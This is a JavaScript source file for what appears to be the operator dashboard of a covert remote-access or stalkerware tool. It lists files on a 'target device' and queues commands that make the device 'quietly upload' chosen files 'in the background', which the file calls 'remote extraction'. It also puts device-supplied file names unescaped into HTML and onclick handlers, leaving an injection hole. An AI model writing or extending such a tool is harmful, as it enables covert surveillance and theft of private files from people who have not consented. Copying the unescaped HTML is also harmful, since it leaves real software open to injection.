class FilesEngine {
    constructor() {
        this.activeDeviceId = localStorage.getItem('active_device_id');
        this.currentPath = '/';
        this.init();
    }

    init() {
        if (!this.activeDeviceId) return;
        this.fetchDirectory(this.currentPath);
    }

    async fetchDirectory(path) {
        const token = localStorage.getItem('owner_token');
        const container = document.getElementById('files-list');
        
        container.innerHTML = `
            <div style="color: var(--text-muted); text-align: center; grid-column: 1 / -1; padding: 60px;">
                <i data-lucide="loader" class="spin" style="width: 40px; height: 40px; margin-bottom: 15px;"></i><br>
                Fetching directory tree...
            </div>`;
            
        document.getElementById('path-breadcrumb').style.display = 'flex';

        try {
            const encodedPath = encodeURIComponent(path);
            const res = await fetch(`/api/files?device_id=${this.activeDeviceId}&path=${encodedPath}`, {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            const result = await res.json();
            
            if (result.status === 'success') {
                this.updateBreadcrumb(path);
                this.renderFiles(result.data);
            } else {
                container.innerHTML = `<div style="color: var(--accent-red); text-align: center; grid-column: 1 / -1; padding: 40px;">System Error: ${result.message}</div>`;
            }
        } catch (e) {
            console.error("Storage Engine Error:", e);
            container.innerHTML = '<div style="color: var(--accent-red); text-align: center; grid-column: 1 / -1; padding: 40px;">Network failure while establishing file tunnel.</div>';
        }
    }

    renderFiles(items) {
        const container = document.getElementById('files-list');
        
        if (items.length === 0) {
            container.innerHTML = `
                <div style="color: var(--text-muted); text-align: center; grid-column: 1 / -1; padding: 60px;">
                    <i data-lucide="folder-open" style="width: 48px; height: 48px; opacity: 0.3; margin-bottom: 10px;"></i><br>
                    Directory is empty.
                </div>`;
            lucide.createIcons();
            return;
        }

        container.innerHTML = items.map(item => {
            const isFolder = item.is_directory === true || item.type === 'directory';
            const icon = isFolder ? 'folder' : this.getFileIcon(item.file_name);
            const iconColor = isFolder ? 'var(--accent-cyan)' : 'var(--text-main)';
            
            // Limit strictness: 12MB
            const sizeInBytes = item.size_bytes || 0;
            const sizeLimit = 12 * 1024 * 1024; 
            const isOversized = !isFolder && sizeInBytes > sizeLimit;
            
            let clickAction = '';
            let extraClass = '';
            let badgeHtml = '';

            if (isFolder) {
                clickAction = `filesEngine.openFolder('${item.file_name}')`;
            } else if (isOversized) {
                clickAction = `alert('Strict Policy: File exceeds 12MB limit. Action blocked to conserve target network and battery.')`;
                extraClass = 'blocked';
                badgeHtml = `<span class="status-badge badge-blocked">Size Limit</span>`;
            } else {
                const fullPath = this.currentPath === '/' ? `/${item.file_name}` : `${this.currentPath}/${item.file_name}`;
                const fileUrl = item.file_url ? `'${item.file_url}'` : 'null';
                clickAction = `filesEngine.downloadOrRequestFile('${item.file_name}', '${fullPath}', ${fileUrl})`;
                
                if (item.file_url) {
                    badgeHtml = `<span class="status-badge badge-ready">Ready</span>`;
                } else {
                    badgeHtml = `<span class="status-badge badge-cloud"><i data-lucide="cloud-download" style="width:12px; height:12px;"></i></span>`;
                }
            }

            const displaySize = isFolder ? 'Folder' : ((sizeInBytes / (1024 * 1024)).toFixed(2) + ' MB');

            return `
            <div class="file-item ${extraClass}" onclick="${clickAction}">
                ${badgeHtml}
                <i data-lucide="${icon}" class="file-icon" style="color: ${iconColor};"></i>
                <div style="width: 100%;">
                    <div class="file-name" title="${item.file_name}">${item.file_name}</div>
                    <div class="file-meta">${displaySize}</div>
                </div>
            </div>
            `;
        }).join('');
        
        lucide.createIcons();
    }

    getFileIcon(filename) {
        if (!filename) return 'file';
        const ext = filename.split('.').pop().toLowerCase();
        const imageExts = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
        const vidExts = ['mp4', 'mkv', 'avi', 'mov'];
        const docExts = ['pdf', 'doc', 'docx', 'txt', 'csv'];
        const archiveExts = ['zip', 'rar', 'apk', 'tar'];

        if (imageExts.includes(ext)) return 'image';
        if (vidExts.includes(ext)) return 'film';
        if (docExts.includes(ext)) return 'file-text';
        if (archiveExts.includes(ext)) return 'package';
        return 'file';
    }

    openFolder(folderName) {
        this.currentPath = this.currentPath === '/' ? `/${folderName}` : `${this.currentPath}/${folderName}`;
        this.fetchDirectory(this.currentPath);
    }

    goUp() {
        if (this.currentPath === '/') return; 
        const pathParts = this.currentPath.split('/').filter(p => p !== '');
        pathParts.pop(); 
        this.currentPath = pathParts.length === 0 ? '/' : '/' + pathParts.join('/');
        this.fetchDirectory(this.currentPath);
    }

    updateBreadcrumb(path) {
        document.getElementById('current-path-text').innerText = path;
    }

    async downloadOrRequestFile(fileName, fullPath, fileUrl) {
        if (fileUrl && fileUrl.startsWith('http')) {
            window.open(fileUrl, '_blank');
            return;
        }

        const isConfirmed = confirm(`Trigger remote extraction?\n\nTarget device will quietly upload "${fileName}" to the server in the background.`);
        if (!isConfirmed) return;

        const token = localStorage.getItem('owner_token');
        const deviceId = this.activeDeviceId;

        try {
            const res = await fetch(`/api/devices/${deviceId}/action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
                body: JSON.stringify({ 
                    action: `upload_specific_file:${fullPath}` 
                })
            });

            const data = await res.json();
            if (data.status === 'success') {
                alert(`Extraction command pushed to target queue!\nWait a minute and refresh to access the file.`);
            } else {
                alert(`Command Failed: ${data.message}`);
            }
        } catch (error) {
            console.error(error);
            alert('Action Server Unreachable.');
        }
    }
}

window.filesEngine = null;

window.requestStorageSync = async function() {
    const isConfirmed = confirm("Send command to target device to re-index its file system? This may take a few moments.");
    if (!isConfirmed) return;

    const token = localStorage.getItem('owner_token');
    const deviceId = localStorage.getItem('active_device_id');

    try {
        await fetch(`/api/devices/${deviceId}/action`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
            body: JSON.stringify({ action: "sync_file_tree" })
        });
        alert("Deep Scan initiated. Metadata tree will update shortly.");
    } catch (e) {
        alert("Failed to queue command.");
    }
};

document.addEventListener('DOMContentLoaded', () => {
    window.filesEngine = new FilesEngine();
});
